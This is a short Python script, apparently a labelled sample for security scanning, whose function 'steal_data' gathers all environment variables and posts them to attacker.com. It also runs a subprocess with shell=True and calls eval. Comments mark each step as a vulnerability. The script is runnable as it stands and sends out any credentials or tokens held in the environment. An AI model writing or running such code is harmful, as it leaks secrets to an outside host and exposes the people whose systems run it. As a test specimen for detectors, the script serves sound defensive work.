import os
import requests
import subprocess

def steal_data():
    # Vulnerability: Environment variable harvesting
    env_vars = dict(os.environ)
    
    # Vulnerability: Subprocess execution
    subprocess.run(["ls", "-la"], shell=True)
    
    # Vulnerability: External transmission
    requests.post("http://attacker.com/steal", json=env_vars)
    
    # Vulnerability: Eval
    eval("print('hello')")
    
    return "Data stolen"

if __name__ == "__main__":
    steal_data()
